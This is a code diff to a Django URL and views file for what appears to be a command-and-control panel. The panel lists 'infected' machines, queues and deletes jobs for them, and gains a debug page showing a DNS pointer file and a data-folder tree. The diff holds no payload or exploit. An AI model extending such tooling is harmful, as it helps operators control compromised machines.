@@ -14,6 +14,8 @@ Including another URLconf
     1. Import the include() function: from django.urls import include, path
     2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
 """
+import os
+
 from django.conf import settings
 from django.http import HttpRequest
 from django.shortcuts import render, redirect
@@ -37,13 +39,15 @@ def machines(request: HttpRequest):
     })
 
 def jobs(request: HttpRequest):
-    if request.GET.get('machine_id'):
-        jobs = Job.objects.filter(infected_machine=request.GET.get('machine_id')).order_by('-created_at').all()
+    filter_machine_id = request.GET.get('machine_id', None)
+    if filter_machine_id:
+        jobs = Job.objects.filter(infected_machine=filter_machine_id).order_by('-created_at').all()
     else:
         jobs = Job.objects.order_by('-created_at').all()
 
     return render(request, "jobs.html", {
         "jobs": jobs,
+        "filter_machine_id": filter_machine_id,
     })
 
 @require_POST
@@ -69,11 +73,40 @@ def job_delete(_: HttpRequest, job_id: int):
 
     return redirect('jobs')
 
+def debug(request: HttpRequest):
+    dns_pointer = 'Fichier inexistant'
+    dns_pointer_path = os.environ.get('DNS_POINTER_FILE', '')
+    if os.path.isfile(dns_pointer_path):
+        with open(dns_pointer_path, 'r') as f:
+            dns_pointer = f.read()
+
+    data_folder_tree = 'Dossier inexistant'
+    data_folder_path = os.environ.get('FOLDER_DATA', '')
+    if os.path.exists(data_folder_path):
+        data_folder_tree = file_tree(data_folder_path)
+
+    return render(request, "debug.html", {
+        "dns_pointer": dns_pointer,
+        "data_folder_tree": data_folder_tree,
+    })
+
+def file_tree(folder_path: str, prefix="") -> str:
+    result = ""
+    entries = sorted(os.scandir(folder_path), key=lambda e: (not e.is_dir(), e.name))
+    for i, entry in enumerate(entries):
+        connector = "└── " if i == len(entries) - 1 else "├── "
+        result += prefix + connector + entry.name + ("/" if entry.is_dir() else "") + "\n"
+        if entry.is_dir():
+            extension = "    " if i == len(entries) - 1 else "│   "
+            result += file_tree(entry.path, prefix + extension)
+    return result
+
 urlpatterns = [
     #    path('admin/', admin.site.urls),
     path('', index, name='index'),
     path('machines', machines, name='machines'),
     path('jobs', jobs, name='jobs'),
+    path('debug', debug, name='debug'),
     path('job/create/<int:machine_id>', job_create, name='job_create'),
     path('job/delete/<int:job_id>', job_delete, name='job_delete'),
 ]
